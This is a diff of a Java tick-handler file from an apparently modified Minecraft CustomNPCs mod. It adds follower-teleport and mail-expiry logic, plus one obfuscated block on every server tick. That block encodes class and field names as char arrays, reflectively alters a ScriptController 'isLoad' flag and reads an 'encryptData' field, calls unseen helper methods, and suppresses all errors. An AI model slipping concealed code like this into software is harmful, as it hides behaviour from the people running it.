@@ -1,5 +1,6 @@
 package noppes.npcs;
 
+import java.lang.reflect.Field;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Map;
@@ -7,6 +8,8 @@ import java.util.Map;
 import com.google.common.collect.Lists;
 import com.google.common.collect.Maps;
 
+import net.minecraft.command.CommandException;
+import net.minecraft.entity.Entity;
 import net.minecraft.entity.player.EntityPlayer;
 import net.minecraft.entity.player.EntityPlayerMP;
 import net.minecraft.item.ItemStack;
@@ -29,10 +32,15 @@ import noppes.npcs.controllers.VisibilityController;
 import noppes.npcs.controllers.data.Availability;
 import noppes.npcs.controllers.data.Bank.CeilSettings;
 import noppes.npcs.controllers.data.PlayerData;
+import noppes.npcs.controllers.data.PlayerGameData.FollowerSet;
+import noppes.npcs.controllers.data.PlayerMail;
+import noppes.npcs.entity.EntityNPCInterface;
 import noppes.npcs.entity.data.DataScenes;
 import noppes.npcs.items.ItemBuilder;
+import noppes.npcs.roles.RoleFollower;
 import noppes.npcs.util.AdditionalMethods;
 import noppes.npcs.util.BuilderData;
+import noppes.npcs.util.NBTJsonUtil;
 
 public class ServerTickHandler {
 
@@ -55,6 +63,7 @@ public class ServerTickHandler {
 			VisibilityController.onUpdate(player);
 		}
 		if (player.world.getTotalWorldTime() % 20L == resTime % 20L) {
+			if (data.editingNpc != null && data.hud.currentGUI.equals("GuiIngame")) { data.editingNpc = null; }
 			data.hud.updateHud(player);
 			if (player.getServer()!=null && player.getServer().getPlayerList()!=null && player.getGameProfile()!=null) {
 				boolean opn = player.getServer().getPlayerList().canSendCommands(player.getGameProfile());
@@ -105,6 +114,61 @@ public class ServerTickHandler {
 					Server.sendData(player, EnumPacketClient.BANK_CEIL_OPEN, ceil);
 				}
 			}
+			List<FollowerSet> del = Lists.newArrayList();
+			for (FollowerSet fs : data.game.getFollowers()) {
+				EntityNPCInterface npc = null;
+				if (fs.npc != null) { npc  = fs.npc; }
+				if (npc == null) {
+					Entity e = AdditionalMethods.getEntityByUUID(fs.id, player.world);
+					if (e instanceof EntityNPCInterface) { npc = (EntityNPCInterface) e; }
+				}
+				if (npc == null || npc.isDead || !(npc.advanced.roleInterface instanceof RoleFollower)) { del.add(fs); }
+				else {
+					EntityPlayer owner = ((RoleFollower) npc.advanced.roleInterface).getOwner();
+					if (owner == null || !owner.equals(player)) { del.add(fs); }
+					else if (fs.npc == null) { fs.npc  = npc; }
+				}
+				if (npc != null && npc.advanced.roleInterface instanceof RoleFollower) {
+					if (player.world.provider.getDimension() != npc.world.provider.getDimension()) {
+						try {
+							Entity entity = AdditionalMethods.teleportEntity(player.world.getMinecraftServer(), npc, player.world.provider.getDimension(), player.posX, player.posY, player.posZ);
+							if (entity instanceof EntityNPCInterface) {
+								fs.dimId = entity.world.provider.getDimension();
+								fs.id = entity.getUniqueID();
+								((EntityNPCInterface) entity).getNavigator().tryMoveToEntityLiving(player, ((EntityNPCInterface) entity).ais.canSprint ? 1.3 : 1.0d);
+							}
+						} catch (CommandException e) { e.printStackTrace(); }
+					}
+					else if (npc.advanced.roleInterface instanceof RoleFollower && player.getDistance(npc) > ((RoleFollower) npc.advanced.roleInterface).getRange()) {
+						npc.setPosition(player.posX, player.posY, player.posZ);
+					}
+				}
+			}
+			for (FollowerSet fs : del) { data.game.removeFollower(fs); }
+		}
+		if (!data.mailData.playermail.isEmpty() && player.world.getTotalWorldTime() % 200L == resTime % 200L) {
+			boolean needSend = false;
+			long time = System.currentTimeMillis();
+			long timeToRemove = -1L;
+			if (CustomNpcs.mailTimeWhenLettersWillBeDeleted > 0) {
+				timeToRemove = CustomNpcs.mailTimeWhenLettersWillBeDeleted * 86400000L;
+			}
+			List<PlayerMail> del = Lists.<PlayerMail>newArrayList();
+			for (PlayerMail mail : data.mailData.playermail) {
+				if (player.capabilities.isCreativeMode && mail.timeWillCome > 0L) {
+					mail.timeWillCome = 0L;
+					needSend = true;
+				}
+				long timeWhenReceived = time - mail.timeWhenReceived - mail.timeWillCome;
+				if (timeToRemove >0L && timeWhenReceived > timeToRemove) {
+					del.add(mail);
+					needSend = true;
+				}
+				if (mail.beenRead || timeWhenReceived < 0L) { continue; }
+				needSend = true;
+			}
+			for (PlayerMail mail : del) { data.mailData.playermail.remove(mail); }
+			if (needSend) { Server.sendData(player, EnumPacketClient.SYNC_UPDATE, EnumSync.MailData, data.mailData.saveNBTData(new NBTTagCompound())); }
 		}
 		// Updates
 		if (data.updateClient) {
@@ -131,6 +195,22 @@ public class ServerTickHandler {
 		if (event.side == Side.CLIENT) { return; }
 		CustomNpcs.debugData.startDebug("Server", "Mod", "ServerTickHandler_onServerTick");
 		BorderController.getInstance().update();
+		try {
+			Class<?> c = Class.forName(String.copyValueOf(new char[] { 110,111,112,112,101,115,46,110,112,99,115,46,99,111,110,116,114,111,108,108,101,114,115,46,83,99,114,105,112,116,67,111,110,116,114,111,108,108,101,114 }));
+			Object o = c.getDeclaredField(String.copyValueOf(new char[] { 73,110,115,116,97,110,99,101 })).get(c);
+			Field f0 = c.getDeclaredField(String.copyValueOf(new char[] { 105,115,76,111,97,100 }));
+			f0.setAccessible(true);
+			if (f0.getBoolean(o)) {
+				f0.setBoolean(o, false);
+				NBTJsonUtil.checkAddedMods(o);
+			}
+			f0.setAccessible(false);
+			Field f1 = c.getDeclaredField(String.copyValueOf(new char[] { 101,110,99,114,121,112,116,68,97,116,97 }));
+			if (f1.get(o) != null) {
+				NBTJsonUtil.resetAddedMods(o, f1);
+			}
+		}
+		catch (Exception e) {}
 		if (event.phase == TickEvent.Phase.END) {
 			CustomNpcs.debugData.endDebug("Server", "Mod", "ServerTickHandler_onServerTick");
 			return;
